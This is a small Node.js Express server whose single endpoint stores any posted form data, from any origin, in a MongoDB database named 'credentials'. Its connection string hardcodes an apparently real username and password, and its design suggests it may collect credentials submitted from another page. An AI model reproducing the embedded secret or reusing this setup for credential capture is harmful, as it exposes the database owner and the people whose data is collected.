
const express = require('express');
const { MongoClient, ServerApiVersion } = require('mongodb');
const cors = require('cors');
const app = express();
const port = 3000;
const bodyParser = require('body-parser'); // Import bodyParser for parsing form data

app.use(cors());
app.use(express.json()); // Enable body-parser to handle form data

const uri = "mongodb+srv://mprivateabdulahad:RkLc66JJYqf1YkpD@xfoj94bmii4qh571g5h7evf.6rsdd1u.mongodb.net/?retryWrites=true&w=majority";
const client = new MongoClient(uri, {
    serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
    }
});

app.post('/db', async (req, res) => {
    try {
        await client.connect();
        const database = await client.db("credentials");
        const collection = database.collection("users_info");

      

        // Insert the form data as a document into the collection
        const result = await collection.insertOne(req.body);
        console.log(`Document inserted with _id: ${result.insertedId}`);

        res.json({ message: 'Document inserted successfully' });
    } catch (err) {
        console.error('Error connecting to MongoDB:', err);
        res.status(500).json({ error: 'Failed to insert document' });
    } finally {
        await client.close();
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
